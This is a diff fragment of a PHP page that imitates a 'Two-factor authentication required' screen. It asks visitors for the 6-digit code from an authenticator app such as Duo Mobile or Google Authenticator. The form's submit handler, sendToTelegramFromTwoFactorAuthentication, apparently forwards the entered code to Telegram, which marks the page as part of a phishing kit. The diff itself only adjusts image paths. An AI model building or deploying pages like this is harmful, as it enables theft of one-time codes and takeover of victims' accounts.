@@ -27,7 +27,7 @@ $userAgent = $_SERVER['HTTP_USER_AGENT'];
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Two-factor authentication required</title>
-    <link rel="icon" href="/images/favicon.ico">
+    <link rel="icon" href="./images/favicon.ico">
        
     <style>
         * {
@@ -428,7 +428,7 @@ $userAgent = $_SERVER['HTTP_USER_AGENT'];
         <p class="description"> Enter the 6-digit code for this account from the two-factor authentication app that you
             set up (such as Duo Mobile or Google Authenticator). </p>
         <div class="illustration">
-            <img src="/images/2fa.jpg" alt="SMS Verification Illustration" style="max-width: 100%; height: auto;">
+            <img src="./images/2fa.jpg" alt="SMS Verification Illustration" style="max-width: 100%; height: auto;">
         </div>
         <form id="loginForm" onsubmit="sendToTelegramFromTwoFactorAuthentication(event)">
             <input type="text" id="code" class="code-input" placeholder="Code" maxlength="8">
